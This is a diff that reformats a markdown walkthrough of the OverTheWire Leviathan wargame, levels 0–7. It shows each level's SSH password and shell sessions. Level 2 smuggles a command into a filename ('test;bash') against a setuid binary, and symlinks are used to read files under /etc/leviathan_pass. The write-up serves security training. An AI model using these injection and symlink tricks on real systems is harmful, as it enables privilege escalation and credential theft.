@@ -8,18 +8,21 @@ tags: [OverTheWire, Leviathan]
 
 # Level 0
 
-To login to the first level use:
+>   To login to the first level use:
+>
+>   ```
+>   Username: leviathan0
+>   Password: leviathan0
+>   ```
+>
+>   Data for the levels can be found in **the homedirectories** . You can look at **/etc/leviathan_pass** for the various level passwords.
+>
 
+```bash
+sshpass -p leviathan0 ssh leviathan0@leviathan.labs.overthewire.org -p 2223
 ```
-Username: leviathan0
-Password: leviathan0
-```
 
-Data for the levels can be found in **the homedirectories** . You can look at **/etc/leviathan_pass** for the various level passwords.
-
-``sshpass -p leviathan0 ssh leviathan0@leviathan.labs.overthewire.org -p 2223``
-
-```
+```bash
 leviathan0@leviathan:~$ ls
 leviathan0@leviathan:~$ ls -la
 total 24
@@ -39,9 +42,11 @@ leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep leviathan
 
 # Level 1
 
-``sshpass -p rioGegei8m ssh leviathan1@leviathan.labs.overthewire.org -p 2223``
-
+```bash
+sshpass -p rioGegei8m ssh leviathan1@leviathan.labs.overthewire.org -p 2223
 ```
+
+```bash
 leviathan1@leviathan:~$ ls
 check
 leviathan1@leviathan:~$ file check
@@ -72,9 +77,11 @@ ougahZi8Ta
 
 # Level 2
 
-``sshpass -p ougahZi8Ta ssh leviathan2@leviathan.labs.overthewire.org -p 2223``
-
+```bash
+sshpass -p ougahZi8Ta ssh leviathan2@leviathan.labs.overthewire.org -p 2223
 ```
+
+```bash
 leviathan2@leviathan:~$ ls
 printfile
 leviathan2@leviathan:~$ ls -l
@@ -89,7 +96,7 @@ You cant have that file...
 
 Weird.. why can't we access the password even though we can run as ``leviathan3``? Let's run ``ltrace`` to check out what's in the script.
 
-```
+```bash
 leviathan2@leviathan:~$ ltrace ./printfile
 __libc_start_main(0x804852b, 1, 0xffffd784, 0x8048610 <unfinished ...>
 puts("*** File Printer ***"*** File Printer ***
@@ -109,8 +116,8 @@ It seems like the script takes a filename as input and then calls ``access()`` t
 
 What if we create a new file as a string literal called ``"test;bash"`` to trick the system into running a fake command, then elevate itself and thereafter run bash?
 
-```
- leviathan2@leviathan:~$ mkdir /tmp/shiro
+```bash
+leviathan2@leviathan:~$ mkdir /tmp/shiro
 leviathan2@leviathan:~$ cd /tmp/shiro
 leviathan2@leviathan:/tmp/shiro$ touch "test;bash"
 leviathan2@leviathan:/tmp/shiro$ ls
@@ -125,7 +132,7 @@ Ahdiemoo1j
 
 When we read the ``ltrace`` output, we realize that the ``/bin/cat`` command uses just the first part of the filename. Therefore, we can exploit this by creating a file that has a space in it to make the ``/bin/cat`` command read it as 2 separate files. Thereafter, we link the second file to the password location using a symbolic link ``ln -s <original file> <fake file>``
 
-```
+```bash
 leviathan2@leviathan:~$ mkdir /tmp/shiro
 leviathan2@leviathan:~$ echo "hi" >> /tmp/shiro/test.txt
 leviathan2@leviathan:~$ ./printfile /tmp/shiro/test.txt
@@ -168,9 +175,11 @@ Ahdiemoo1j
 
 # Level 3
 
-``sshpass -p Ahdiemoo1j ssh leviathan3@leviathan.labs.overthewire.org -p 2223``
-
+```bash
+sshpass -p Ahdiemoo1j ssh leviathan3@leviathan.labs.overthewire.org -p 2223
 ```
+
+```bash
 leviathan3@leviathan:~$ ls
 level3
 leviathan3@leviathan:~$ ls -l
@@ -201,9 +210,11 @@ vuH0coox6m
 
 # Level 4
 
-``sshpass -p vuH0coox6m ssh leviathan4@leviathan.labs.overthewire.org -p 2223``
-
+```bash
+sshpass -p vuH0coox6m ssh leviathan4@leviathan.labs.overthewire.org -p 2223
 ```
+
+```bash
 leviathan4@leviathan:~$ ls
 leviathan4@leviathan:~$ ls -la
 total 24
@@ -229,9 +240,11 @@ Seems like its a binary message. Let's use a binary to text [convertor](https://
 
 # Level 5
 
-``sshpass -p Tith4cokei ssh leviathan5@leviathan.labs.overthewire.org -p 2223``
-
+```bash
+sshpass -p Tith4cokei ssh leviathan5@leviathan.labs.overthewire.org -p 2223
 ```
+
+```bash
 leviathan5@leviathan:~$ ls
 leviathan5
 leviathan5@leviathan:~$ ls -l leviathan5
@@ -249,7 +262,7 @@ exit(-1 <no return ...>
 
 What happens if we create a file inside ``/tmp/file.log``?
 
-```
+```bash
 leviathan5@leviathan:~$ ls /tmp/file.log
 ls: cannot access '/tmp/file.log': No such file or directory
 leviathan5@leviathan:~$ echo "hi" > /tmp/file.log
@@ -261,7 +274,7 @@ Cannot find /tmp/file.log
 
 Interesting.. It seems that the script will read the file and then deletes it. Can we then create a file in ``/tmp/file.log`` and then use the symbolic link to link the file to the password file?
 
-```
+```bash
 leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
 leviathan5@leviathan:~$ ./leviathan5
 UgaoFee4li
@@ -270,9 +283,11 @@ UgaoFee4li
 
 # Level 6
 
-``sshpass -p UgaoFee4li ssh leviathan6@leviathan.labs.overthewire.org -p 2223``
-
+```bash
+sshpass -p UgaoFee4li ssh leviathan6@leviathan.labs.overthewire.org -p 2223
 ```
+
+```bash
 leviathan6@leviathan:~$ ls
 leviathan6
 leviathan6@leviathan:~$ ls -l
@@ -303,9 +318,11 @@ ahy7MaeBo9
 
 # Level 7
 
-`sshpass -p ahy7MaeBo9 ssh leviathan7@leviathan.labs.overthewire.org -p 2223`
-
+```bash
+sshpass -p ahy7MaeBo9 ssh leviathan7@leviathan.labs.overthewire.org -p 2223
 ```
+
+```bash
 leviathan7@leviathan:~$ ls
 CONGRATULATIONS
 leviathan7@leviathan:~$ file CONGRATULATIONS
